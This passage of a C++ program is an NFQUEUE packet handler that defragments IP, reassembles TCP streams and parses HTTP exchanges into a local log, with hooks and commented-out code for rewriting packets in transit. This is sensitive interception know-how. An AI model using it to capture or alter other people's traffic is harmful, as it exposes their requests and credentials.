/**
 * Shamelessly adapted from
 * https://www.andersoncalixto.com.br/2015/11/using-nfqueue-and-libnetfilter_queue/
 */

#include <stdint.h>
#include <netinet/in.h>
#include <linux/in6.h>
#include <linux/netfilter.h>
#include <linux/types.h>
#include <libnetfilter_queue/libnetfilter_queue.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <map>
#include "packet_structs.h"
#include <string.h>
#include <vector>
#include <chrono>

struct packet_verdict_t {
  unsigned char *new_data;
  uint32_t new_data_length;
  u_int32_t verdict;
  int packet_id;
};

int min(int a, int b) { return a < b ? a : b; }

/**
 * Returns the header length in units of byte
 */
int get_tcp_header_length(sniff_tcp *tcp) { return TH_OFF(tcp) * 4; }

/**
 * Returns true if and only if `text` starts with `prefix`. Assumes both pointer
 * are not-null.
 */
bool prefix_match(u_char *text, char *prefix) {
  for (int i = 0;; i++) {
    if (prefix[i] == 0) return true;
    if (text[i] != prefix[i]) return false;
  }
}

/**
 * Returns true if and only if there is \r\n in the buffer
 */
bool has_complete_line_q(u_char *buffer, int length) {
  for (int i = 0; i < length - 1; i++) {
    if (buffer[i] == '\r' && buffer[i + 1] == '\n') return true;
  }
  return false;
}

// TODO: This does not work if fragments come out-of-order
namespace IPDefragmenter {

/**
 * Stores a packet starting from the transport header.
 * The client of this struct is responsible for freeing the buffer
 */
struct Packet {
  u_char *data;
  int length;
};

/**
 * Stores a packet being reconstructed. These parts contain data from the
 * transport header onwards (i.e. transport header + payload).
 *
 * The client of this struct is responsible for freeing the buffer
 */
struct PartialPacket {
  u_char *data;
  int length;
};

/**
 * Taken from
 * https://networkengineering.stackexchange.com/questions/46514/identification-field-in-ipv4-header:
 * "In IPv4, the Identification (ID) field is a 16-bit value that is
 * unique for every datagram for a given source address, destination
 * address, and protocol, such that it does not repeat within the
 * maximum datagram lifetime (MDL) [RFC791] [RFC1122]. As currently
 * specified, all datagrams between a source and destination of a given
 * protocol must have unique IPv4 ID values over a period of this MDL,
 * which is typically interpreted as two minutes and is related to the
 * recommended reassembly timeout [RFC1122]. This uniqueness is
 * currently specified as for all datagrams, regardless of fragmentation
 * settings."
 *
 * Our convention: 128-bit key in this order: <source IP, dest IP, protocol,
 * identification number>
 *
 */
std::map<__uint128_t, std::vector<PartialPacket>> packet_fragments;

__uint128_t build_map_key(sniff_ip *ip) {
  __uint128_t key = 0;
  key = ip->ip_src.s_addr;                // 32-bit number
  key = (key << 32) | ip->ip_dst.s_addr;  // 32-bit number
  key = (key << 8) | ip->ip_p;            // 8-bit number
  key = (key << 16) | ip->ip_id;          // 16-bit number
  return key;
}

/**
 * Returns nullptr if the current `data` could not complete a packet (i.e. more
 * fragments are expected).
 *
 * Expects `data` to contain packet data starting from IP header (including it
 * as well).
 *
 * Otherwise (i.e. we have just reassembled the whole packet) returns the
 * reassembled payload, starting from the transport header. The returned pointer
 * should be freed by the caller.
 */
Packet *defrag(u_char *data, int total_length) {
  struct sniff_ip *ip = (struct sniff_ip *)data;
  int ip_header_length = IP_HL(ip) * 4;

  // is this not-fragmented ? (easy case)
  if (packet_fragments.count(build_map_key(ip)) == 0 &&
      ((ip->ip_off & IP_MF) == 0)) {
    printf("IP reassembly case 0 ¬¬'\n");
    u_char *buffer = new u_char[total_length - ip_header_length];
    memcpy(buffer, data + ip_header_length, total_length - ip_header_length);
    return new Packet{data : buffer, length : total_length - ip_header_length};
  }

  // it is fragmented =( life gets harder

  // case 1: we already received a fragment and are now receiving a middle
  // fragment
  if (packet_fragments.count(build_map_key(ip)) != 0 &&
      ((ip->ip_off & IP_MF) != 0)) {
    printf("IP reassembly case 1\n");
    auto &&packet_parts = packet_fragments[build_map_key(ip)];
    packet_parts.push_back(PartialPacket{data : data, length : total_length});
    return nullptr;
  }
  // case 2: we already received a fragment and are now receiving the LAST
  // fragment
  else if (packet_fragments.count(build_map_key(ip)) != 0 &&
           ((ip->ip_off & IP_MF) == 0)) {
    printf("IP reassembly case 2\n");
    auto &&packet_parts = packet_fragments[build_map_key(ip)];
    packet_parts.push_back(PartialPacket{data : data, length : total_length});

    int total_part_length = 0;
    for (auto &&packet_part : packet_parts) {
      total_part_length += packet_part.length;
    }

    Packet *packet = new Packet;
    packet->length = total_part_length;
    packet->data = new u_char[total_part_length];

    int incremental_part_length = 0;
    for (auto &&packet_part : packet_parts) {
      memcpy(packet->data + incremental_part_length, packet_part.data,
             packet_part.length);
      delete[] packet_part.data;
      incremental_part_length += packet_part.length;
    }

    packet_fragments.erase(build_map_key(ip));

    return packet;

  }
  // case 3: we had not received a fragment before. this if the first fragment
  else {
    printf("IP reassembly case 3\n");
    packet_fragments[build_map_key(ip)] = std::vector<PartialPacket>();
    auto &&packet_parts = packet_fragments[build_map_key(ip)];
    packet_parts.push_back(PartialPacket{data : data, length : total_length});
    return nullptr;
  }

  printf("Reached an impossible-to-reach code\n");
  exit(1);
}

}  // namespace IPDefragmenter

/**
 * Provides TCP content deduplication (by ignoring retransmissions, for example)
 */
namespace TCPStreamer {

/**
 * Stores out-of-order bytes received through TCP but not immediately
 * consumable (because previous bytes still have not arrived).
 *
 * Clients of this struct are responsible for freeing `data`
 */
struct OOOBytes {
  u_int begin_seq_num;
  u_int next_seq_num;
  u_int length;
  u_char *data;
};

/**
 * Stores information for a single source_ip:source_port:dest_ip:dest_port
 * quartet
 */
struct TCPFlowStatus {
  /**
   * initial sequence number used
   */
  u_int initial_seqnum;
  /**
   * Quantity of bytes received until the moment. The next expected sequence
   * number is, therefore, `initial_seqnum` + `received_bytes_count`
   */
  u_int received_bytes_count = 0;
  /**
   * True iff we receive a FIN packet.
   */
  bool terminated = false;
  std::map<u_int, OOOBytes> ooo_queue;
};

/**
 * Our convention: 128-bit key in this order: <source IP, source port,
 * destination IP, destination port>
 */
std::map<__uint128_t, TCPFlowStatus> flow_status_map;

__uint128_t build_map_key(sniff_tcp *tcp, sniff_ip *ip) {
  __uint128_t key = 0;
  key = ip->ip_src.s_addr;                               // 32-bit number
  key = (key << 16) | ((__uint128_t)tcp->th_sport);      // 16-bit number
  key = (key << 32) | ((__uint128_t)ip->ip_dst.s_addr);  // 32-bit number
  key = (key << 16) | ((__uint128_t)tcp->th_dport);      // 16-bit number
  return key;
}

__uint128_t build_peer_map_key(sniff_tcp *tcp, sniff_ip *ip) {
  __uint128_t key = 0;
  key = ip->ip_dst.s_addr;                               // 32-bit number
  key = (key << 16) | ((__uint128_t)tcp->th_dport);      // 16-bit number
  key = (key << 32) | ((__uint128_t)ip->ip_src.s_addr);  // 32-bit number
  key = (key << 16) | ((__uint128_t)tcp->th_sport);      // 16-bit number
  return key;
}

/**
 * Returns the payload contained in the packet. If the packet has no payload, or
 * if the payload is duplicated (for example, a retransmission), returns
 * nullptr. Clients of this function are responsible for freeing the returned
 * pointer, since it is a copy of data passed into the function.
 *
 * The second returned value indicates if the connection has ended. This will
 * only be true when both FINs are seen (both from source and destination). As
 * such, clients of this function should understand that BOTH connections are
 * over in case a true is returned
 *
 * `transport_length` is the packet length starting from tcp header.
 */
std::pair<u_char *, bool> process_packet(sniff_tcp *tcp, sniff_ip *ip,
                                         int transport_length) {
  printf("TCP process packet\n");
  // beginning of connection
  if ((tcp->th_flags & TH_SYN) &&
      flow_status_map.count(build_map_key(tcp, ip)) == 0) {
    printf("Beggining of connection\n");
    flow_status_map[build_map_key(tcp, ip)] = TCPFlowStatus{
      initial_seqnum : ntohl(tcp->th_seq) + 1,
      received_bytes_count : 0,
      terminated : false
    };
    return {nullptr, false};
  }

  if (!(tcp->th_flags & TH_SYN) &&
      flow_status_map.count(build_map_key(tcp, ip)) == 0) {
    printf("Did not see start of TCP connection\n");
    return {nullptr, false};
  }

  auto &&status = flow_status_map[build_map_key(tcp, ip)];

  // end of connection
  if (tcp->th_flags & TH_FIN) {
    printf("End of connection (FIN)\n");
    status.terminated = true;
    auto &&peer_status = flow_status_map[build_peer_map_key(tcp, ip)];
    if (peer_status.terminated) {
      flow_status_map.erase(build_map_key(tcp, ip));
      flow_status_map.erase(build_peer_map_key(tcp, ip));
      return {nullptr, true};
    }
    // do nothing otherwise since we may still have payload
  }

  // mid-connection
  u_int next_seq_num = status.initial_seqnum + status.received_bytes_count;
  if (ntohl(tcp->th_seq) < next_seq_num) {
    printf(
        "TCP already had this payload (retransmission), since received %u and "
        "expected sequence number was %u\n",
        ntohl(tcp->th_seq), next_seq_num);
    return {nullptr, false};  // because this is a retransmission (we already
                              // had this payload)
  }

  // bytes arrived out-of-order
  if (ntohl(tcp->th_seq) > next_seq_num) {
    printf("TCP-streamer queued some out-of-order bytes\n");
    u_int tcp_header_length = get_tcp_header_length(tcp);
    u_int payload_length = transport_length - tcp_header_length;
    if (payload_length == 0) {
      return {nullptr, false};
    }
    u_char *data = new u_char[payload_length];
    memcpy(data, (u_char *)tcp + tcp_header_length, payload_length);
    status.ooo_queue[ntohl(tcp->th_seq)] = OOOBytes{
      begin_seq_num : ntohl(tcp->th_seq),
      next_seq_num : ntohl(tcp->th_seq) + payload_length,
      length : payload_length,
      data : data
    };
    return {nullptr, false};
  }

  // bytes arrived in-order

  // accumulate previous out-of-order bytes
  printf("TCP detected in-order bytes\n");
  u_int tcp_header_length = get_tcp_header_length(tcp);
  u_int payload_length = transport_length - tcp_header_length;
  if (payload_length == 0) {
    printf("Expected some TCP payload\n");
    return {nullptr, false};
  }
  u_int accum_payload_length = payload_length;
  u_int ooo_seq_num = next_seq_num + payload_length;
  u_char *data = new u_char[payload_length];
  memcpy(data, (u_char *)tcp + tcp_header_length, payload_length);
  std::vector<OOOBytes> ooo_recovered;
  ooo_recovered.push_back(OOOBytes{
    begin_seq_num : next_seq_num,
    next_seq_num : ooo_seq_num,
    length : payload_length,
    data : data
  });
  while (status.ooo_queue.count(ooo_seq_num) != 0) {
    auto &&ooo_bytes = status.ooo_queue[ooo_seq_num];
    ooo_recovered.push_back(ooo_bytes);
    ooo_seq_num = ooo_bytes.next_seq_num;
    accum_payload_length += ooo_bytes.length;
  }
  printf("TCP-streamer returned %d consecutive segments\n",
         ooo_recovered.size());
  // accumulate all bytes into single buffer, while freeing old pointer and
  // removing from the map
  u_char *buffer = new u_char[accum_payload_length];
  u_int offset = 0;
  for (auto &&ooo_bytes : ooo_recovered) {
    memcpy(buffer + offset, ooo_bytes.data, ooo_bytes.length);
    offset += ooo_bytes.length;
    delete[] ooo_bytes.data;
    status.ooo_queue.erase(ooo_bytes.begin_seq_num);
  }
  status.received_bytes_count += accum_payload_length;
  return {buffer, false};
}
}  // namespace TCPStreamer

namespace HTTPParser {

enum class ParserState {
  // nothing is known
  INITIAL,
  // positioned at first request line (expecting request method)
  START_OF_REQUEST,
  // positioned at first response line
  START_OF_RESPONSE,
  // may be: (1) start of header (2) empty line indicating the end of headers.
  // Pertains either to a request or a response
  START_OF_HEADER_LINE,
  // will be aligned with start of body (either in a request or a response). The
  // body may be empty, though
  START_OF_BODY,
  // already received some body bytes (a strictly quantity - not 0), but not all
  MIDDLE_OF_BODY
};

/**
 * Stores information about reassembly status (received headers, received body,
 * etc.) concerning a single
 * source_ip:source_port:destination_ip:destination_port quartet and a single
 * HTTP message
 *
 * Clients of this struct are responsible for freeing the pointers
 */
struct MessageReassemblyStatus {
  ParserState state = ParserState::INITIAL;
  bool message_header_terminated = false;
  /**
   * True if and only if the entire message body has been received (or if the
   * message has no body, in which case the body has trivially been received).
   *
   * See RFC2616 for how to detect end of body
   */
  bool message_body_terminated = false;
  u_char *raw_body;
  int raw_body_length = 0;
  int raw_body_partial_length = 0;
  /**
   * All bytes composing the message
   */
  u_char *raw_data = nullptr;
  int raw_data_length = 0;
  /**
   * Where we are currently parsing in `raw_data`
   */
  int raw_data_index = 0;

  /**
   * True if and only if this struct is being used to reassemble a request (as
   * opposed to reassemble a response)
   */
  bool is_request;

  // followings fields may not apply (for example, if this struct has
  // `is_request`, then fields pertaining to a response will not be touched)

  std::string request_method;
  std::string request_url;
  std::map<std::string, std::string> headers;
  int response_status;
};

/**
 * Stores both an HTTP request and its response. Clients of this struct are
 * responsible for freeing the pointers
 */
struct HTTPReqRes {
  std::string request_method;
  std::string request_url;
  std::map<std::string, std::string> request_headers;
  std::map<std::string, std::string> response_headers;
  int response_status;
  u_char *request_body;
  int request_body_length;
  u_char *response_body;
  int response_body_length;
};

/**
 * By convention, the key is, in this order: <source ip, source port,
 * destination ip, destination port>
 */
std::map<__uint128_t, MessageReassemblyStatus> message_status_map;

/**
 * Useful when the communicating peers pipeline requests. At the time of
 * processing a response, more than 1 request may have already gone out and
 * been completely parsed. As we still want those requests' data, we require
 * this vector.
 *
 * The vector will contain partial HTTPReqRes structs, filled only with the
 * request data. The response data will be filled once the response arrives and
 * is completely parsed, which obviously happens strictly after the request goes
 * out to the net completely
 */
std::map<__uint128_t, std::vector<HTTPReqRes>> pipelined_requests;

FILE *open_log() {
  FILE *log = fopen("data/reqres/log.txt", "a+");
  fprintf(log, "\n\n");
  return log;
}

FILE *log = open_log();

__uint128_t build_map_key(sniff_tcp *tcp, sniff_ip *ip) {
  __uint128_t key = 0;
  key = ip->ip_src.s_addr;                               // 32-bit number
  key = (key << 16) | ((__uint128_t)tcp->th_sport);      // 16-bit number
  key = (key << 32) | ((__uint128_t)ip->ip_dst.s_addr);  // 32-bit number
  key = (key << 16) | ((__uint128_t)tcp->th_dport);      // 16-bit number
  return key;
}

__uint128_t build_peer_map_key(sniff_tcp *tcp, sniff_ip *ip) {
  __uint128_t key = 0;
  key = ip->ip_dst.s_addr;                               // 32-bit number
  key = (key << 16) | ((__uint128_t)tcp->th_dport);      // 16-bit number
  key = (key << 32) | ((__uint128_t)ip->ip_src.s_addr);  // 32-bit number
  key = (key << 16) | ((__uint128_t)tcp->th_sport);      // 16-bit number
  return key;
}

/**
 * Resets everything except for `is_request`, because this characterizes the
 * peer's role (client or server) and does not change between requests.
 *
 * Accomodates leftover data in buffer (which is not zero in case peers use
 * message pipelining)
 */
void reset_reassembly_status(MessageReassemblyStatus &status) {
  auto &&next_index = status.raw_data_index;
  status.headers.clear();
  status.raw_body_length = 0;
  status.response_status = 0;
  status.message_body_terminated = false;
  status.message_header_terminated = false;
  status.request_method.clear();
  status.request_url.clear();
  status.state = status.is_request ? ParserState::START_OF_REQUEST
                                   : ParserState::START_OF_RESPONSE;
  if (status.raw_body) delete[] status.raw_body;
  status.raw_body_length = 0;
  status.raw_body_partial_length = 0;
  if (next_index == status.raw_data_length) {  // no leftover data
    status.raw_data_length = 0;
    delete[] status.raw_data;
    status.raw_data_index = 0;
  } else {  // there is some leftover data
    int total_length = status.raw_data_length;
    int new_length = total_length - next_index;
    status.raw_data_length = new_length;
    u_char *old_data = status.raw_data;
    u_char *new_data = new u_char[new_length];
    memcpy(new_data, old_data + next_index, new_length);
    delete[] old_data;
    status.raw_data = new_data;
    status.raw_data_index = 0;
  }
}

/**
 * Outputs the record of the request-response exchange.
 *
 * Removes the associated pipelined request from `pipelined_requests`.
 */
HTTPReqRes *finish_response_message(sniff_ip *ip, sniff_tcp *tcp) {
  printf("finish_response_message\n");
  __uint128_t map_key = build_map_key(tcp, ip);
  __uint128_t peer_map_key = build_peer_map_key(tcp, ip);

  auto &&status = message_status_map[map_key];
  auto &&next_index = status.raw_data_index;

  // recover the pipelined request and fill it with response data
  HTTPReqRes *reqres = new HTTPReqRes;
  if (pipelined_requests.count(peer_map_key) == 0) {
    printf("should have a request in memory\n");
    exit(1);
  }
  HTTPReqRes front = pipelined_requests[peer_map_key].front();
  *reqres = front;
  pipelined_requests[peer_map_key].erase(
      pipelined_requests[peer_map_key].begin());
  if (status.raw_body_length != 0) {
    reqres->response_body = new u_char[status.raw_body_length];
    memcpy(reqres->response_body, status.raw_body, status.raw_body_length);
    reqres->response_body_length = status.raw_body_length;
  } else {
    reqres->response_body = nullptr;
    reqres->response_body_length = 0;
  }
  reqres->response_headers = status.headers;
  reqres->response_status = status.response_status;

  return reqres;
}

/**
 * Does nothing more than enqueue the request in the pipelining history
 */
void finish_request_message(sniff_ip *ip, sniff_tcp *tcp) {
  printf("finish_request_message\n");
  __uint128_t map_key = build_map_key(tcp, ip);

  auto &&status = message_status_map[map_key];
  auto &&next_index = status.raw_data_index;

  // store the pipelined request
  HTTPReqRes partial;
  if (status.raw_body_length != 0) {
    partial.request_body = new u_char[status.raw_body_length];
    memcpy(partial.request_body, status.raw_body, status.raw_body_length);
    partial.request_body_length = status.raw_body_length;
  } else {
    partial.request_body = nullptr;
    partial.request_body_length = 0;
  }
  partial.request_headers = status.headers;
  partial.request_method = status.request_method;
  partial.request_url = status.request_url;
  if (pipelined_requests.count(map_key) == 0) {
    pipelined_requests[map_key] = std::vector<HTTPReqRes>();
  }
  pipelined_requests[map_key].push_back(partial);
}

/**
 * Can parse either a request or a response.
 *
 * Expects that at least 1 body byte has already been received (and stored in
 * `raw_body`) prior to calling this function
 */
HTTPReqRes *process_bytes_since_body_middle(sniff_ip *ip, sniff_tcp *tcp) {
  printf("process_bytes_since_body_middle\n");
  __uint128_t map_key = build_map_key(tcp, ip);

  auto &&status = message_status_map[map_key];
  auto &&next_index = status.raw_data_index;

  int consumable_length =
      min(status.raw_data_length - next_index,
          status.raw_body_length - status.raw_body_partial_length);

  // no further bytes yet
  if (consumable_length == 0) {
    printf("no consumable length in middle of body\n");
    return nullptr;
  }

  memcpy(status.raw_body + status.raw_body_partial_length,
         &status.raw_data[next_index], consumable_length);
  status.raw_body_partial_length += consumable_length;
  next_index += consumable_length;

  // maybe we finished receiving the body (either of a request or a response)
  if (status.raw_body_partial_length == status.raw_body_length) {
    HTTPReqRes *reqres = nullptr;

    if (status.is_request) {
      printf("finishing request message\n");
      finish_request_message(ip, tcp);
    } else {
      printf("finishing response message\n");
      reqres = finish_response_message(ip, tcp);
    }

    // prepare state for future requests/responses
    reset_reassembly_status(status);

    return reqres;
  }

  // maybe not
  return nullptr;
}

/**
 * Can parse either a request or a response
 */
HTTPReqRes *process_bytes_since_body_start(sniff_ip *ip, sniff_tcp *tcp) {
  printf("process_bytes_since_body_start\n");
  __uint128_t map_key = build_map_key(tcp, ip);

  auto &&status = message_status_map[map_key];
  auto &&next_index = status.raw_data_index;

  int content_length = -1;
  if (status.headers.count("Content-Length") != 0) {
    content_length = atoi(status.headers["Content-Length"].data());
  }
  if (status.headers.count("content-length") != 0) {
    content_length = atoi(status.headers["content-length"].data());
  }
  // TODO: As of now, we only support Content-Length header for body size
  // calculation
  // case 1: unsupported size-specifying header
  if (content_length == -1 && status.headers.count("Transfer-Encoding") != 0) {
    printf("We only support Content-Length\n");
    exit(1);
  }

  // case 2: There is no body and this is a request
  else if (content_length == -1 && status.is_request) {
    printf("case 2\n");
    finish_request_message(ip, tcp);

    // prepare state for future requests
    reset_reassembly_status(status);

    return nullptr;
  }

  // case 3: There is no body and this is a response
  else if (content_length == -1 && !status.is_request) {
    printf("case 3\n");
    HTTPReqRes *reqres = finish_response_message(ip, tcp);

    // prepare state for future responses
    reset_reassembly_status(status);

    return reqres;

  }

  // case 4: There IS body (either in a request or in a response)
  else if (content_length != -1) {
    printf("case 4\n");
    int consumable_length =
        min(status.raw_data_length - next_index, content_length);

    // we are about to receive the body, but have not received the first byte
    // yet
    if (consumable_length == 0) {
      return nullptr;
    }

    status.raw_body_length = content_length;
    status.raw_body_partial_length = consumable_length;
    status.raw_body = new u_char[content_length];
    memcpy(status.raw_body, &status.raw_data[next_index], consumable_length);
    next_index += consumable_length;

    // maybe we received the whole body at once (either of a request or of a
    // response)
    if (consumable_length == content_length) {
      HTTPReqRes *reqres = nullptr;

      if (status.is_request) {
        finish_request_message(ip, tcp);
      } else {
        reqres = finish_response_message(ip, tcp);
      }

      // prepare state for future responses
      reset_reassembly_status(status);

      return reqres;
    }

    // maybe not
    status.state = ParserState::MIDDLE_OF_BODY;
    return nullptr;
  }
}

/**
 * Can parse either a request or a response
 */
HTTPReqRes *process_bytes_since_header_line(sniff_ip *ip, sniff_tcp *tcp) {
  printf("process_bytes_since_header_line\n");
  __uint128_t map_key = build_map_key(tcp, ip);

  auto &&status = message_status_map[map_key];
  auto &&next_index = status.raw_data_index;

  while (true) {  // will only get out on break or return
    status.state = ParserState::START_OF_HEADER_LINE;

    // determine if we have a complete header line
    // TODO: Simplifying assumption: folded header lines are deprecated
    bool has_complete_line = has_complete_line_q(
        &status.raw_data[next_index], status.raw_data_length - next_index);

    // maybe we are already at header-end
    if (has_complete_line &&
        prefix_match(&status.raw_data[next_index], "\r\n")) {
      next_index += 2;
      status.state = ParserState::START_OF_BODY;
      status.message_header_terminated = true;
      return process_bytes_since_body_start(ip, tcp);
    }

    // save line fragment for later processing
    if (!has_complete_line) {
      // int rest_length = status.raw_data_length - next_index;
      // u_char *rest = new u_char[rest_length];
      // memcpy(rest, &status.raw_data[next_index], rest_length);
      // delete[] status.raw_data;
      // status.raw_data = rest;
      // status.raw_data_length = rest_length;
      // status.state = ParserState::START_OF_HEADER_LINE;
      return nullptr;
    }

    // we have entire line. Consume the header and proceed to start of next
    // line
    while (isspace(status.raw_data[next_index])) next_index++;

    // capture header name
    std::string header_name = "";
    while (!isspace(status.raw_data[next_index]) &&
           status.raw_data[next_index] != ':') {
      header_name.push_back(status.raw_data[next_index]);
      next_index++;
    }

    next_index++;  // skip ":" separator

    while (isspace(status.raw_data[next_index])) next_index++;

    // capture header value
    std::string header_value = "";
    while (status.raw_data[next_index] != '\r') {
      header_value.push_back(status.raw_data[next_index]);
      next_index++;
    }

    status.headers[header_name] = header_value;
    printf("Got header '%s', value '%s'\n", header_name.data(),
           header_value.data());

    // skip \r\n

    next_index++;
    if (status.raw_data[next_index] != '\n') {
      printf("Expected line terminator, but got '%c'\n",
             status.raw_data[next_index]);
      printf("Data Context:\n(%.*s)\n\n", next_index, status.raw_data);
      exit(1);
    }
    next_index++;
  }
}

/**
 * Can parse a request. CANNOT parse a response
 */
HTTPReqRes *process_bytes_since_request_line(sniff_ip *ip, sniff_tcp *tcp) {
  printf("process_bytes_since_request_line\n");
  __uint128_t map_key = build_map_key(tcp, ip);

  auto &&status = message_status_map[map_key];
  auto &&next_index = status.raw_data_index;

  // determine if we have a complete request line
  bool has_complete_line =
      has_complete_line_q(&status.raw_data[status.raw_data_index],
                          status.raw_data_length - next_index);

  if (!has_complete_line) {
    return nullptr;
  }

  if (status.raw_data_length - next_index >= 7 &&
      prefix_match(&status.raw_data[next_index], "OPTIONS")) {
    next_index += 7;  // right after OPTIONS
    status.request_method = "OPTIONS";
  } else if (status.raw_data_length - next_index >= 3 &&
             prefix_match(&status.raw_data[next_index], "GET")) {
    next_index += 3;  // right after GET
    status.request_method = "GET";
  } else if (status.raw_data_length - next_index >= 4 &&
             prefix_match(&status.raw_data[next_index], "HEAD")) {
    next_index += 4;  // right after HEAD
    status.request_method = "HEAD";
  } else if (status.raw_data_length - next_index >= 4 &&
             prefix_match(&status.raw_data[next_index], "POST")) {
    next_index += 4;  // right after POST
    status.request_method = "POST";
  } else if (status.raw_data_length - next_index >= 3 &&
             prefix_match(&status.raw_data[next_index], "PUT")) {
    next_index += 3;  // right after PUT
    status.request_method = "PUT";
  } else if (status.raw_data_length - next_index >= 6 &&
             prefix_match(&status.raw_data[next_index], "DELETE")) {
    next_index += 6;  // right after DELETE
    status.request_method = "DELETE";
  } else {
    printf("HTTP method not supported.\n");
    return nullptr;
  }

  // skip white space
  while (isspace(status.raw_data[next_index])) next_index++;

  // now comes the request URI
  status.request_url = "";
  while (!isspace(status.raw_data[next_index])) {
    status.request_url.push_back(status.raw_data[next_index]);
    next_index++;
  }

  // finally the HTTP version. Does not matter to us
  while (!prefix_match(&status.raw_data[next_index], "\r\n")) {
    next_index++;
  }

  next_index += 2;  // skip \r\n

  // now we are at the start of the first header line.
  return process_bytes_since_header_line(ip, tcp);
}

/**
 * Can parse a response. CANNOT parse a request
 */
HTTPReqRes *process_bytes_since_status_line(sniff_ip *ip, sniff_tcp *tcp) {
  printf("process_bytes_since_status_line\n");
  __uint128_t map_key = build_map_key(tcp, ip);

  auto &&status = message_status_map[map_key];
  auto &&next_index = status.raw_data_index;

  // determine if we have a complete request line
  bool has_complete_line =
      has_complete_line_q(&status.raw_data[status.raw_data_index],
                          status.raw_data_length - next_index);

  if (!has_complete_line) {
    return nullptr;
  }

  // skip HTTP version
  while (!isspace(status.raw_data[next_index])) next_index++;

  // skip whitespace
  while (isspace(status.raw_data[next_index])) next_index++;

  // capture status code
  status.response_status = 0;
  while (!isspace(status.raw_data[next_index])) {
    status.response_status =
        status.response_status * 10 + (status.raw_data[next_index] - '0');
    next_index++;
  }

  // skip whitespace
  while (isspace(status.raw_data[next_index])) next_index++;

  // skip status phrase
  while (status.raw_data[next_index] != '\r') next_index++;

  // skip \r\n at end of line
  next_index += 2;

  return process_bytes_since_header_line(ip, tcp);
}

/**
 * Expects to receive TCP payload already deduplicated.
 *
 * Returns nullptr if the request-response cycle has not completed yet.
 * Otherwise, returns the contents of the HTTP exchange. Clients of this
 * function are responsible for freeing the returned pointer.
 *
 * `data` is expected to contain purely TCP payload (no headers)
 */
HTTPReqRes *process_bytes(sniff_ip *ip, sniff_tcp *tcp, u_char *data,
                          u_int length) {
  __uint128_t map_key = build_map_key(tcp, ip);

  // if we have no record of this exchange, try to interpret it as the
  // beginning of an HTTP request or response
  if (message_status_map.count(map_key) == 0) {
    // peer also has no record (or explicitly states it is parsing a
    // response). Therefore this is a request
    if (message_status_map.count(build_peer_map_key(tcp, ip)) == 0 ||
        message_status_map[build_peer_map_key(tcp, ip)].is_request == false) {
      MessageReassemblyStatus status{
        state : ParserState::START_OF_REQUEST,
        message_header_terminated : false,
        message_body_terminated : false,
        raw_body : nullptr,
        raw_body_length : 0,
        raw_body_partial_length : 0,
        raw_data : nullptr,
        raw_data_length : (int)length,
        raw_data_index : 0,
        is_request : true
      };
      status.raw_data = new u_char[length];
      memcpy(status.raw_data, data, length);
      message_status_map[map_key] = status;

      return process_bytes_since_request_line(ip, tcp);
    }
    // else, this is a response
    else {
      MessageReassemblyStatus status{
        state : ParserState::START_OF_REQUEST,
        message_header_terminated : false,
        message_body_terminated : false,
        raw_body : nullptr,
        raw_body_length : 0,
        raw_body_partial_length : 0,
        raw_data : nullptr,
        raw_data_length : (int)length,
        raw_data_index : 0,
        is_request : false
      };
      status.raw_data = new u_char[length];
      memcpy(status.raw_data, data, length);
      message_status_map[map_key] = status;

      return process_bytes_since_status_line(ip, tcp);
    }
  }
  // we have a record of this exchange. Either parse it as a request or as a
  // response
  else {
    auto &&status = message_status_map[map_key];

    // append data to `raw_data` pointer
    if (status.raw_data_length == 0) {
      status.raw_data = new u_char[length];
      memcpy(status.raw_data, data, length);
      status.raw_data_length = length;
    } else {
      u_char *raw_data_old = status.raw_data;
      int old_length = status.raw_data_length;
      u_char *raw_data_new = new u_char[old_length + length];
      memcpy(raw_data_new, raw_data_old, old_length);
      memcpy(raw_data_new + old_length, data, length);
      delete[] raw_data_old;
      status.raw_data_length = old_length + length;
      status.raw_data = raw_data_new;
    }

    // Dispatch to the correct handler. It will disambiguate between
    // request/response by itself as needed
    switch (status.state) {
      case ParserState::START_OF_REQUEST:
        return process_bytes_since_request_line(ip, tcp);
        break;

      case ParserState::START_OF_HEADER_LINE:
        return process_bytes_since_header_line(ip, tcp);
        break;

      case ParserState::START_OF_BODY:
        return process_bytes_since_body_start(ip, tcp);
        break;

      case ParserState::MIDDLE_OF_BODY:
        return process_bytes_since_body_middle(ip, tcp);
        break;

      case ParserState::START_OF_RESPONSE:
        return process_bytes_since_status_line(ip, tcp);
        break;

      default:
        printf("There is no default\n");
        exit(1);
        break;
    }
  }
}

}  // namespace HTTPParser

/**
 * `verdict` should be manipulated by the function to signal packet
 * modifications.
 */
static void print_pkt(struct nfq_data *tb, packet_verdict_t *verdict) {
  int id = 0;
  struct nfqnl_msg_packet_hdr *ph;
  struct nfqnl_msg_packet_hw *hwph;
  u_int32_t mark, ifi;
  int ret;
  unsigned char *data;
  struct iphdr *ip_info;

  ph = nfq_get_msg_packet_hdr(tb);
  if (ph) {
    id = ntohl(ph->packet_id);
    printf("hw_protocol=0x%04x hook=%u id=%u ", ntohs(ph->hw_protocol),
           ph->hook, id);
  }

  hwph = nfq_get_packet_hw(tb);
  if (hwph) {
    int i, hlen = ntohs(hwph->hw_addrlen);

    printf("hw_src_addr=");
    for (i = 0; i < hlen - 1; i++) printf("%02x:", hwph->hw_addr[i]);
    printf("%02x ", hwph->hw_addr[hlen - 1]);
  }

  mark = nfq_get_nfmark(tb);
  if (mark) printf("mark=%u ", mark);

  ifi = nfq_get_indev(tb);
  if (ifi) printf("indev=%u ", ifi);

  ifi = nfq_get_outdev(tb);
  if (ifi) printf("outdev=%u ", ifi);
  ifi = nfq_get_physindev(tb);
  if (ifi) printf("physindev=%u ", ifi);

  ifi = nfq_get_physoutdev(tb);
  if (ifi) printf("physoutdev=%u ", ifi);

  ret = nfq_get_payload(tb, &data);
  if (ret >= 0) {
    printf("payload_len(ip+tcp+payload)=%d ", ret);
    // processPacketData (data, ret);
    struct sniff_ip *ip = (struct sniff_ip *)data;
    int ip_header_length = IP_HL(ip) * 4;
    printf("ip_header_length=%d ", ip_header_length);
    // if (ip->ip_p == IPPROTO_UDP) {
    //   struct sniff_udp *udp = (sniff_udp *)(data + ip_header_length);
    //   u_char *payload = data + ip_header_length + sizeof(sniff_udp);
    //   printf("Payload data:\n(%.*s)\n\n", udp->len - sizeof(sniff_udp),
    //          payload);
    //   payload[0] = 'A';
    //   udp->check = 0;
    //   verdict->new_data = data;
    //   verdict->new_data_length = ret;
    // }
    if (ip->ip_p != IPPROTO_TCP) {
      printf("Not a TCP packet. Skipping...\n\n");
      return;
    }

